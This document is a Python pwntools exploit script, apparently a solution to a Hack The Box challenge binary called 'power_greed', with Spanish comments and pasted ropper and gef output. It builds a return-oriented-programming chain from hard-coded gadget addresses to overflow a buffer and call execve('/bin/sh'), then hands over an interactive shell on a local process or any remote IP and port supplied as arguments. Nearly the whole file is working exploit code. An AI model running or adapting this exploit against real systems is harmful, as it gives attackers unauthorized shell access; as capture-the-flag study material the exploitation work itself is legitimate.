#!/usr/bin/python3
import signal
import sys
from pwn import *
import warnings
from argparse import ArgumentParser
def exit_handler(sig, frame):
    print("\n[!] Saliendo de la aplicacion...")
    sys.exit(1)

#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
context.log_level = 'critical'

def exploit(ip, puerto):
    if ip in ('127.0.0.1', 'localhost'):
        print("[+] Iniciando proceso local")
        r    = process('./power_greed')
    else:
        print("[+] Iniciando proceso remoto")
        r    = remote(ip, puerto)
    sla = lambda x,y : r.sendlineafter(x,y)

    for _ in range(2): sla('> ', '1') #envia datos hasta llegar a la funcio interesada
    sla(': ', 'y')

    '''
    rax |            |          rdi         |           rsi            |          rdx
    59  | sys_execve | const char *filename | const char *const argv[] | const char *const envp[]
    '''
    '''
    ┌──(usuario㉿kali)-[~/HTB/challenge]
    └─$ ropper --search "pop rax" -f power_greed
    [INFO] Load gadgets for section: LOAD
    [LOAD] loading... 100%
    [LOAD] removing double gadgets... 100%
    [INFO] Searching for gadgets: pop rax
    [INFO] File: power_greed
    0x000000000042adab: pop rax; ret;
    '''
    pop_rax_ret = 0x000000000042adab
    '''
    ┌──(usuario㉿kali)-[~/HTB/challenge]
    └─$ ropper --search "pop rdi" -f power_greed
    [INFO] Load gadgets from cache
    [LOAD] loading... 100%
    [LOAD] removing double gadgets... 100%
    [INFO] Searching for gadgets: pop rdi
    [INFO] File: power_greed
    0x0000000000402bd8: pop rdi; pop rbp; ret;
    '''
    pop_rdi_pop_rbp_ret = 0x0000000000402bd8
    '''
    ┌──(usuario㉿kali)-[~/HTB/challenge]
    └─$ ropper --search "pop rsi" -f power_greed
    [INFO] Load gadgets from cache
    [LOAD] loading... 100%
    [LOAD] removing double gadgets... 100%
    [INFO] Searching for gadgets: pop rsi
    [INFO] File: power_greed
    0x000000000040c002: pop rsi; pop rbp; ret;
    '''
    pop_rsi_pop_rbp_ret = 0x000000000040c002

    '''
    gef➤  search-pattern "/bin/sh"
    [+] Searching '/bin/sh' in memory
    [+] In '/home/usuario/HTB/challenge/power_greed'(0x481000-0x4a8000), permission=r--
    0x481778 - 0x48177f  →   "/bin/sh"
    '''
    bin_sh = 0x481778

    '''
    ┌──(usuario㉿kali)-[~/HTB/challenge]
    └─$ ropper --file ./power_greed --opcode 5a31c05b
    Opcode
    ======
    0x0000000000425980: 5a31c05b;
    0x000000000046f4dc: 5a31c05b;

    2 gadgets found
    '''
    pop_rdx_xor_eax_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = 0x000000000046f4dc

    '''
    ┌──(usuario㉿kali)-[~/HTB/challenge]
    └─$ ropper --search "syscall" -f ./power_greed
    [INFO] Load gadgets from cache
    [LOAD] loading... 100%
    [LOAD] removing double gadgets... 100%
    [INFO] Searching for gadgets: syscall
    [INFO] File: ./power_greed
    0x000000000040141a: syscall;
    '''
    syscall = 0x000000000040141a

    payload = flat({
        0x38: p64(pop_rdi_pop_rbp_ret) + p64(bin_sh) + p64(0) +
        p64(pop_rsi_pop_rbp_ret) + p64(0) + p64(0) +
        p64(pop_rdx_xor_eax_pop_rbx_pop_r12_pop_r13_pop_rbp_ret) + p64(0)*5 +
        p64(pop_rax_ret) + p64(0x3b) +
        p64(syscall)
    })
    print("[+] Enviando codigo malicioso")
    sla('buffer: ', payload)
    print("[+] Obteniendo shell interactiva")
    r.interactive()
if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-i", "--ip", help="Direccion IP del host a analizar", required=True)
    parser.add_argument("-p", "--port", help="Puerto del host a analizar", required=True)

    args = parser.parse_args()
    exploit(args.ip,args.port)
